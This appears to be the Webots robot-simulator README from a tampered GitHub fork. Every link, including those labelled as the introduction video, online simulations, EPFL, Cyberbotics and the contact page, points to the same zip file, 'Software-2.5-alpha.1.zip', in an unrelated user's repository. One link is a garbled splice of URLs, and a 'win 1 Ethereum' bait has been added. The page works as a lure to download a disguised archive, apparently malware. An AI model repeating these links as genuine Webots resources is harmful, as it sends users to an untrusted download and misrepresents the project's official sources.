Webots provides a complete development environment to model, program and simulate robots, vehicles and mechanical systems.

- See the [Webots introduction video](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip).
- View online Webots simulations at [https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip).
- Participate in the [IROS 2023 Simulated Humanoid Robot Wrestling Competition](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip%3A%2F%https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip%2Fcyberbotics%2Fwrestling%2Fblob%2Fmain%2Fworlds%https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip) and win 1 Ethereum.

### About us

Webots was originally designed at [EPFL](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip) in 1996 and then further developed and commercialized by [Cyberbotics](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip) since 1998. In December 2018, Webots was open sourced. Since then, [Cyberbotics](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip) continues to develop Webots thanks to paid customer support, training, consulting for industry and academic research projects.

[Contact us](https://raw.githubusercontent.com/Beautiie561/webots/master/projects/robots/rec/fabtino/protos/Software-2.5-alpha.1.zip) to discuss your custom robot simulation projects.
